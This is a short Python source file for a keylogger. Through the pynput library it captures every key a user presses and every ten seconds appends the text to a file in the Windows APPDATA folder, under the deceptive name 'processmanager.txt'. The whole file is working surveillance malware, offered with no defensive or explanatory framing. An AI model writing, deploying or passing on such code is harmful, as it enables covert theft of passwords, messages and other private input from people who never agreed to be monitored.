#!/usr/bin/python
import pynput.keyboard
import threading
import os

log = ""
path = os.environ["appdata"] + "\\processmanager.txt"
def process_keys(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        elif key == key.right:
            log += ""
        elif key == key.left:
            log += ""
        elif key == key.up:
            log += ""
        elif key == key.down:
            log += ""       
        else:
            log += " "+ str(key) + " "

def report():
    global log
    global path
    fin = open(path, "a")
    fin.write(log)
    log = ""
    fin.close()
    timer = threading.Timer(10, report)
    timer.start()

def start():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
    with keyboard_listener:
        report()
        keyboard_listener.join()